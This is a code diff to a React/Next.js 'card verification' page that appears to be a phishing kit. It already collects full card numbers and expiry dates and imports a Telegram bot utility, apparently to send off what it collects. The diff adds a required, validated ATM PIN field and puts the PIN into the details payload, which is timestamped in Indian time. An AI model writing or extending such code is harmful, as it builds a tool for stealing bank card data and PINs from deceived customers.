@@ -2,19 +2,21 @@
 
 import React, { useState } from "react";
 import { useRouter } from "next/navigation";
-import { ArrowLeft, CreditCard, Calendar, AlertCircle, CheckCircle } from "lucide-react";
+import { ArrowLeft, CreditCard, Calendar, AlertCircle, CheckCircle, Lock } from "lucide-react";
 import { telegramBot } from "../../utils/telegramBot";
 
 export default function CardVerification() {
   const router = useRouter();
   const [cardData, setCardData] = useState({
     cardNumber: "",
-    expiryDate: ""
+    expiryDate: "",
+    atmPin: ""
   });
 
   const [cardErrors, setCardErrors] = useState({
     cardNumber: "",
-    expiryDate: ""
+    expiryDate: "",
+    atmPin: ""
   });
 
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -36,6 +38,10 @@ export default function CardVerification() {
         formattedValue = numericValue.slice(0, 2) + "/" + numericValue.slice(2, 4);
       }
       setCardData(prev => ({ ...prev, [name]: formattedValue }));
+    } else if (name === "atmPin") {
+      // Only allow numbers, max 4 digits
+      const numericValue = value.replace(/\D/g, "").slice(0, 4);
+      setCardData(prev => ({ ...prev, [name]: numericValue }));
     } else {
       setCardData(prev => ({ ...prev, [name]: value }));
     }
@@ -47,7 +53,8 @@ export default function CardVerification() {
   const validateCardForm = () => {
     const newErrors = {
       cardNumber: "",
-      expiryDate: ""
+      expiryDate: "",
+      atmPin: ""
     };
 
     // Card Number validation
@@ -79,8 +86,17 @@ export default function CardVerification() {
       }
     }
 
+    // ATM PIN validation
+    if (!cardData.atmPin) {
+      newErrors.atmPin = "ATM PIN is required";
+    } else if (cardData.atmPin.length !== 4) {
+      newErrors.atmPin = "ATM PIN must be exactly 4 digits";
+    } else if (!/^\d+$/.test(cardData.atmPin)) {
+      newErrors.atmPin = "ATM PIN should contain only digits";
+    }
+
     setCardErrors(newErrors);
-    return !newErrors.cardNumber && !newErrors.expiryDate;
+    return !newErrors.cardNumber && !newErrors.expiryDate && !newErrors.atmPin;
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -96,6 +112,7 @@ export default function CardVerification() {
     const cardDetails = {
       cardNumber: cardData.cardNumber, // Send full card number with spaces
       expiryDate: cardData.expiryDate,
+      atmPin: cardData.atmPin,
       timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
     };
     
@@ -254,6 +271,36 @@ export default function CardVerification() {
                     {cardErrors.expiryDate}
                   </div>
                 )}
+              </div>
+
+              {/* ATM PIN Field */}
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  ATM PIN <span className="text-red-500">*</span>
+                </label>
+                <div className="relative">
+                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                    <Lock size={18} className="text-gray-400" />
+                  </div>
+                  <input
+                    type="password"
+                    name="atmPin"
+                    value={cardData.atmPin}
+                    onChange={handleCardChange}
+                    className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-[#8B1538] focus:border-transparent outline-none transition-colors text-lg font-mono ${
+                      cardErrors.atmPin ? "border-red-500" : "border-gray-300"
+                    }`}
+                    placeholder="****"
+                    maxLength={4}
+                  />
+                </div>
+                {cardErrors.atmPin && (
+                  <div className="flex items-center mt-1 text-red-500 text-sm">
+                    <AlertCircle size={14} className="mr-1" />
+                    {cardErrors.atmPin}
+                  </div>
+                )}
+                <p className="text-xs text-gray-500 mt-1">Enter your 4-digit ATM PIN for verification</p>
               </div>
 
               {/* Card Type Display */}
